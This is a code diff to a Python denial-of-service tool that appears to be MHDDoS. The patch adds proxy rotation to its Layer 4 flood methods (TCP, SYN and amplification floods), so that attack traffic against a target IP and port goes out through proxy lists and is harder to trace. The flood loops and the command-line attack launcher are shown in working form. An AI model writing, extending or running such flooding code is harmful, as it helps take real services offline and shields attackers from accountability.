@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from contextlib import suppress
 from itertools import cycle
@@ -17,8 +18,6 @@ from sys import argv, exit as _exit
 from threading import Thread, Event, Lock
 from time import sleep, time
 from typing import Set, List, Any, Tuple
-from urllib import parse
-
 from PyRoxy import Proxy, Tools as ProxyTools, ProxyUtiles, ProxyType, ProxyChecker
 from certifi import where
 from cfscrape import create_scraper
@@ -88,7 +87,6 @@ class Counter(object):
 requests_sent = Counter()
 bytes_sent = Counter()
 
-
 class Tools:
     @staticmethod
     def humanbytes(i: int, binary: bool = False, precision: int = 2):
@@ -126,11 +124,13 @@ class Layer4(Thread):
     _ref: Any
     SENT_FLOOD: Any
     _amp_payloads = cycle
+    _proxies: List[Proxy] = None
 
     def __init__(self, target: Tuple[str, int],
                  ref: List[str] = None,
                  method: str = "TCP",
-                 synevent: Event = None):
+                 synevent: Event = None,
+                 proxies: Set[Proxy] = None):
         super().__init__(daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
@@ -138,6 +138,8 @@ class Layer4(Thread):
         self._method = method
         self._target = target
         self._synevent = synevent
+        if proxies:
+            self._proxies = list(proxies)
 
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
@@ -146,6 +148,11 @@ class Layer4(Thread):
             with suppress(Exception):
                 while self._synevent.is_set():
                     self.SENT_FLOOD()
+
+    def get_effective_socket(self, conn_type = AF_INET, sock_type = SOCK_STREAM, proto_type = IPPROTO_TCP):
+        if self._proxies:
+            return randchoice(self._proxies).open_socket(conn_type, sock_type, proto_type)
+        return socket(conn_type, sock_type, proto_type)
 
     def select(self, name):
         self.SENT_FLOOD = self.TCP
@@ -182,7 +189,7 @@ class Layer4(Thread):
     def TCP(self) -> None:
         global bytes_sent, requests_sent
         try:
-            with socket(AF_INET, SOCK_STREAM) as s:
+            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
                 while s.send(randbytes(1024)):
@@ -195,7 +202,7 @@ class Layer4(Thread):
         global bytes_sent, requests_sent
         payload = b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA'
         try:
-            with socket(AF_INET, SOCK_STREAM) as s:
+            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                 s.connect(self._target)
 
@@ -225,7 +232,7 @@ class Layer4(Thread):
         global bytes_sent, requests_sent
         payload = self._genrate_syn()
         try:
-            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+            with self.get_effective_socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(payload, self._target):
                     requests_sent += 1
@@ -238,7 +245,7 @@ class Layer4(Thread):
         global bytes_sent, requests_sent
         payload = next(self._amp_payloads)
         try:
-            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+            with self.get_effective_socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(*payload):
                     requests_sent += 1
@@ -993,7 +1000,7 @@ class ToolsConsole:
                '\n'
                'Example:\n'
                '    Layer7: python3 %s %s %s %s %s proxy.txt %s %s\n'
-               '    Layer4: python3 %s %s %s %s %s') % (argv[0], argv[0],
+               '    Layer4: python3 %s %s %s %s %s proxy.txt') % (argv[0], argv[0],
                                                         ", ".join(Methods.LAYER4_METHODS),
                                                         len(Methods.LAYER4_METHODS),
                                                         ", ".join(Methods.LAYER7_METHODS),
@@ -1021,7 +1028,6 @@ class ToolsConsole:
         with suppress(Exception), get("https://ipwhois.app/json/%s/" % domain) as s:
             return s.json()
         return {"success": False}
-
 
 if __name__ == '__main__':
     with open(__dir__ / "config.json") as f:
@@ -1074,6 +1080,8 @@ if __name__ == '__main__':
                     if not uagents: exit("Empty Useragent File ")
                     if not referers: exit("Empty Referer File ")
 
+                    if proxy_ty not in {4, 5, 1, 0}: exit("Proxy Type Not Found [4, 5, 1, 0]")
+                    if threads > 1000: logger.warning("thread is higher than 1000")
                     if proxy_ty not in {4, 5, 1, 0}: exit("Socks Type Not Found [4, 5, 1, 0]")
                     if threads > 1000: logger.warning("Thread is higher than 1000")
                     if rpc > 100: logger.warning("RPC (Request Pre Connection) is higher than 100")
@@ -1114,7 +1122,16 @@ if __name__ == '__main__':
                         logger.warning("Port Not Selected, Set To Default: 80")
                     else:
                         target = target.split(":")[0]
-
+                    proxy_ty = int(argv[6].strip())
+                    proxy_li = Path(__dir__ / "files/proxies/" / argv[5].strip())
+                    proxies = None
+                    if proxy_li.exists():
+                        proxies = ProxyUtiles.readIPPortFromFile(proxy_li)
+                    if not proxies:
+                        logger.info("Empty Proxy File, Running layer 4 witout proxy")
+                        proxies = None
+                    if proxies:
+                        logger.info(f"Proxy Count: {len(proxies):,}")
                     if 65535 < port or port < 1: exit("Invalid Port [Min: 1 / Max: 65535] ")
                     if not ProxyTools.Patterns.IP.match(target): exit("Invalid Ip Selected")
                     if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
@@ -1133,7 +1150,7 @@ if __name__ == '__main__':
                             logger.setLevel("DEBUG")
 
                     for _ in range(threads):
-                        Layer4((target, port), ref, method, event).start()
+                        Layer4((target, port), ref, method, event,proxies).start()
 
                 logger.info("Attack Started to %s with %s method for %s seconds, threads: %d!" %
                             (target or url.human_repr(), method, timer, threads))
